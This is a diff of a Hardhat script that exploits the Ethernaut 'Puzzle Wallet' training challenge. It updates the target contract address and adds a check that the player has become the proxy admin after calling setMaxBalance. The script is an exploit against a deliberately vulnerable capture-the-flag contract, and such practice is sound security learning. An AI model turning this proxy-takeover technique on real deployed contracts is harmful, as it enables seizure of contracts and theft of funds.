@@ -3,7 +3,7 @@ import { ethers } from "hardhat";
 
 const attackPuzzleWallet = async () => {
     // change contract addresses here.
-    const puzzleWalletAddress = "0xAc7EcD98B60C2094BdD63eEaF73436ebE8A28e9a"; //type "await contract.address()" in ethernaut console
+    const puzzleWalletAddress = "0x383e5cdD8324Bb0E1DA147b2fD869e1cfA930887"; //type "await contract.address()" in ethernaut console
     const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
 
     // Don't touch below
@@ -71,6 +71,9 @@ const attackPuzzleWallet = async () => {
     // 5. From here we can setmaxbalance() to change admin to player
     const tx5 = await contractPuzzleWallet.setMaxBalance(playerAddress);
     const txReceipt5 = tx5.wait();
+    const contractPuzzleProxy = await ethers.getContractAt("PuzzleProxy", puzzleWalletAddress);
+    const admin = await contractPuzzleProxy.admin();
+    console.log(`Puzzzle Proxy Admin is: ${admin} (Should be ${playerAddress})`);
 };
 
 attackPuzzleWallet()
